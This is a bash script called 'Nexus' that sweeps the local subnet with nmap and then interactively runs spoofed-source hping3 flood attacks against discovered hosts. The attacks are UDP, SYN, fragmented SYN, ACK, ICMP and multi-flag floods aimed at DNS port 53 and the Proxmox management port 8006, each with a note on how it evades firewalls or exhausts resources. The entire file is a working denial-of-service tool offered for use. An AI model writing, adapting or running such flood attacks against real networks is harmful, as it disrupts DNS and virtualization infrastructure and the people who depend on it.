#!/bin/bash

# ==========================
# Nexus ASCII Art Banner
# ==========================
echo "███╗░░██╗███████╗██╗░░██╗██╗░░░██╗░██████╗"
echo "████╗░██║██╔════╝╚██╗██╔╝██║░░░██║██╔════╝"
echo "██╔██╗██║█████╗░░░╚███╔╝░██║░░░██║╚█████╗░"
echo "██║╚████║██╔══╝░░░██╔██╗░██║░░░██║░╚═══██╗"
echo "██║░╚███║███████╗██╔╝╚██╗╚██████╔╝██████╔╝"
echo "╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝░╚═════╝░╚═════╝░"
echo
sleep 1

# ==========================
# Check for required tools
# ==========================
check_dependency() {
    if ! command -v $1 &> /dev/null; then
        echo "Error: $1 is not installed. Please install it to continue."
        exit 1
    fi
}

check_dependency nmap
check_dependency hping3
check_dependency ip

# ==========================
# Detect network interface and subnet
# ==========================
INTERFACE=$(ip route | grep '^default' | awk '{print $5}' | head -n 1)
if [ -z "$INTERFACE" ]; then
    echo "Error: Could not detect network interface."
    exit 1
fi

NETWORK=$(ip -o -f inet addr show $INTERFACE | awk '{print $4}' | head -n 1)
if [ -z "$NETWORK" ]; then
    echo "Error: Could not detect network."
    exit 1
fi

echo "[*] Detected interface: $INTERFACE"
echo "[*] Detected network: $NETWORK"
sleep 1

# ==========================
# Automatic Ping Sweep
# ==========================
echo "[*] Performing automatic network discovery on $NETWORK..."
# Extract IP addresses from nmap output
HOSTS=$(nmap -sn $NETWORK | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)

if [ -z "$HOSTS" ]; then
    echo "[!] No hosts discovered. Exiting."
    exit 1
fi

echo "[*] Hosts discovered:"
echo "$HOSTS"
sleep 1

# ==========================
# DNS & Proxmox Attacks with explanations
# ==========================
declare -A dns_attacks
dns_attacks=(
    ["UDP Flood"]="hping3 --udp --flood -V --rand-source -d 1400 -p 53"
    ["SYN Flood"]="hping3 -S --flood -V -p 53 --rand-source -d 1400"
    ["ICMP Flood"]="hping3 --icmp --flood --rand-source -d 1400"
    ["Fragmented SYN Flood"]="hping3 -S --flood -V -p 53 -f --rand-source -d 1400"
    ["Multiple Flag Attack"]="hping3 -F -S -R -P -A -U --flood -V --rand-source -p 53"
)

declare -A dns_explanations
dns_explanations=(
    ["UDP Flood"]="Floods the target with UDP packets on DNS port (53). Bypasses simple firewalls that allow UDP on port 53."
    ["SYN Flood"]="Floods the target with SYN packets on DNS port (53). Can cause resource exhaustion on the target."
    ["ICMP Flood"]="Floods the target with ICMP packets. Can cause network congestion and slow down the target."
    ["Fragmented SYN Flood"]="Sends fragmented SYN packets to bypass basic firewall rules and overwhelm the target."
    ["Multiple Flag Attack"]="Sends packets with multiple flags set (FIN, SYN, RST, PSH, ACK, URG) to confuse the target's TCP stack."
)

declare -A proxmox_attacks
proxmox_attacks=(
    ["SYN Flood Fragmented"]="hping3 -S --flood -V -p 8006 -f --rand-source -d 1400"
    ["SYN Flood"]="hping3 -S --flood -V -p 8006 --rand-source -d 1400"
    ["Multiple Flag Attack"]="hping3 -F -S -R -P -A -U --flood -V --rand-source -p 8006"
    ["ACK Flood"]="hping3 -A --flood --rand-source -p 8006 -d 1200"
    ["ICMP Flood"]="hping3 --icmp --flood --rand-source -d 1400"
)

declare -A proxmox_explanations
proxmox_explanations=(
    ["SYN Flood Fragmented"]="Floods the target with fragmented SYN packets on Proxmox port (8006). Fragmentation can bypass some security measures."
    ["SYN Flood"]="Floods the target with SYN packets on Proxmox port (8006). Aims to exhaust connection resources."
    ["Multiple Flag Attack"]="Sends packets with multiple flags set to confuse the Proxmox web interface's TCP handling."
    ["ACK Flood"]="Floods the target with ACK packets. Can overwhelm stateful inspection firewalls tracking connection states."
    ["ICMP Flood"]="Floods the target with ICMP packets. Can cause network congestion affecting Proxmox management interface."
)

# Function to scan specific ports
scan_ports() {
    local HOST=$1
    echo "[*] Scanning for DNS (port 53) and Proxmox (port 8006) on $HOST..."
    
    # Scan for DNS
    dns_result=$(nmap -p 53 $HOST | grep "53/tcp")
    if echo "$dns_result" | grep -q "open"; then
        echo "[+] DNS (port 53) is OPEN on $HOST"
    else
        echo "[-] DNS (port 53) is closed or filtered on $HOST"
    fi
    
    # Scan for Proxmox
    proxmox_result=$(nmap -p 8006 $HOST | grep "8006/tcp")
    if echo "$proxmox_result" | grep -q "open"; then
        echo "[+] Proxmox (port 8006) is OPEN on $HOST"
    else
        echo "[-] Proxmox (port 8006) is closed or filtered on $HOST"
    fi
}

attack_host() {
    local HOST=$1
    echo
    echo "[*] Host: $HOST detected."
    
    # Ask to scan specific ports
    read -p "Do you want to scan for DNS and Proxmox ports on $HOST? (y/n): " SCAN_CHOICE
    if [[ "$SCAN_CHOICE" =~ ^[Yy]$ ]]; then
        scan_ports $HOST
    fi
    
    echo "Select attack mode:"
    echo "1) DNS Mode"
    echo "2) Proxmox Mode"
    read -p "Choice: " MODE

    if [ "$MODE" == "1" ]; then
        echo "[*] DNS Mode selected."
        for ATTACK_NAME in "${!dns_attacks[@]}"; do
            echo
            echo "=== $ATTACK_NAME ==="
            echo "Description: ${dns_explanations[$ATTACK_NAME]}"
            echo "Command: ${dns_attacks[$ATTACK_NAME]} $HOST"
            read -p "Run this attack? (y/n/skip all): " RUN
            if [[ "$RUN" =~ ^[Yy]$ ]]; then
                echo "[*] Executing: $ATTACK_NAME"
                eval "${dns_attacks[$ATTACK_NAME]} $HOST"
            elif [[ "$RUN" =~ ^[Ss]$ ]]; then
                echo "[*] Skipping all remaining attacks."
                break
            fi
        done
    elif [ "$MODE" == "2" ]; then
        echo "[*] Proxmox Mode selected."
        for ATTACK_NAME in "${!proxmox_attacks[@]}"; do
            echo
            echo "=== $ATTACK_NAME ==="
            echo "Description: ${proxmox_explanations[$ATTACK_NAME]}"
            echo "Command: ${proxmox_attacks[$ATTACK_NAME]} $HOST"
            read -p "Run this attack? (y/n/skip all): " RUN
            if [[ "$RUN" =~ ^[Yy]$ ]]; then
                echo "[*] Executing: $ATTACK_NAME"
                eval "${proxmox_attacks[$ATTACK_NAME]} $HOST"
            elif [[ "$RUN" =~ ^[Ss]$ ]]; then
                echo "[*] Skipping all remaining attacks."
                break
            fi
        done
    else
        echo "Invalid choice, skipping host $HOST."
    fi
}

# ==========================
# Iterate over discovered hosts
# ==========================
for HOST in $HOSTS; do
    # Skip network and broadcast addresses
    if [[ "$HOST" == *".0" ]] || [[ "$HOST" == *".255" ]]; then
        continue
    fi
    
    read -p "Do you want to attack $HOST? (y/n): " ATTACK_CHOICE
    if [[ "$ATTACK_CHOICE" =~ ^[Yy]$ ]]; then
        attack_host $HOST
    fi
done

# ==========================
# Optionally scan for new hosts
# ==========================
while true; do
    echo
    read -p "Scan for new hosts? (y/n): " NEWSCAN
    if [[ "$NEWSCAN" =~ ^[Yy]$ ]]; then
        echo "[*] Scanning for new hosts..."
        NEW_HOSTS=$(nmap -sn $NETWORK | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
        
        for HOST in $NEW_HOSTS; do
            # Skip if we've already seen this host
            if echo "$HOSTS" | grep -q "$HOST"; then
                continue
            fi
            
            # Skip network and broadcast addresses
            if [[ "$HOST" == *".0" ]] || [[ "$HOST" == *".255" ]]; then
                continue
            fi
            
            echo "[*] New host discovered: $HOST"
            HOSTS="$HOSTS $HOST"
            
            read -p "Do you want to attack $HOST? (y/n): " ATTACK_CHOICE
            if [[ "$ATTACK_CHOICE" =~ ^[Yy]$ ]]; then
                attack_host $HOST
            fi
        done
    else
        echo "Exiting..."
        exit 0
    fi
done
